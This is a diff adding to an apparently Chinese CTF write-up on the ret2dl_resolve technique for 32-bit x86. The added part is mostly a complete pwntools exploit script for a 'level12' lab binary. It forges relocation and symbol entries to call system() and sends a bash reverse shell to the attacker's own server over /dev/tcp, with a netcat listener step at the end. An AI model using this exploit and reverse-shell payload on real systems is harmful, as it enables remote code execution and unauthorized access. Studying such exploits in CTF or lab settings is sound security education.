@@ -376,3 +376,89 @@ jmp     ds:dword_804A008
 
 想知道怎么做看[这里](https://delcoding.github.io/2019/01/ret2dl_resolve_x86/)好了
 
+最近太忙了，先贴个exp，之后再哔哔
+
+```python
+from pwn import *
+context.log_level = 'debug'
+
+io = remote('192.168.210.11',10012)
+#io = process('./level12')
+
+elf = ELF('level12')
+pattern = 'A'*40
+read_plt = elf.plt['read']
+
+ppp_ret = 0x080484e9
+pop_ebp_ret = 0x080484eb
+leave_ret = 0x080483a8
+
+stack_size = 0x800
+bss_addr = 0x0804a020
+
+base_stage = bss_addr + stack_size
+
+plt0 = 0x080482f0
+read_offset = 0x8
+index_offset = read_offset
+
+
+rel_plt = 0x080482b0
+index_offset = (base_stage + 28) - rel_plt
+read_got = elf.got['read']
+
+dynsym = 0x080481cc
+dynstr = 0x0804822c
+
+fake_sym_addr = base_stage + 36
+
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
+#sizeof(Elf32_Sym) in .dynsym = 10 bytes
+fake_sym_addr = fake_sym_addr + align
+
+index_dynsym = (fake_sym_addr - dynsym) / 0x10
+#index of function () in .dynstr
+
+r_info = (index_dynsym << 8 ) | 0x07
+
+fake_reloc = p32(read_got) + p32(r_info)
+
+st_name = (fake_sym_addr + 0x10) - dynstr
+fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
+
+payload  = pattern
+payload += p32(base_stage)
+payload += p32(read_plt)
+payload += p32(leave_ret)
+payload += p32(0)
+payload += p32(base_stage)
+payload += p32(150)
+
+#gdb.attach(io)
+
+main_addr = 0x08048457
+
+payload2 =  'A' * 4
+payload2 += p32(plt0)
+payload2 += p32(index_offset)
+payload2 += p32(main_addr)
+payload2 += p32(base_stage + 80)
+payload2 += 'C'*4
+payload2 += 'C'*4
+#replace previous 2 parameters
+payload2 += fake_reloc
+payload2 += 'Q' * align
+payload2 += fake_sym
+payload2 += 'system\x00'
+payload2 += 'F' * (80 - len(payload2))
+payload2 += "bash -c 'bash -i >&/dev/tcp/你服务器ip地址/你服务器开放的端口 0>&1'"
+payload2 += '\x00'
+payload2 += 'A' * (150 - len(payload2))
+
+fin = payload + payload2
+
+io.sendline(fin)
+```
+
+在服务器上``nc -l 6611``，然后跑这个脚本，就能get shell
+
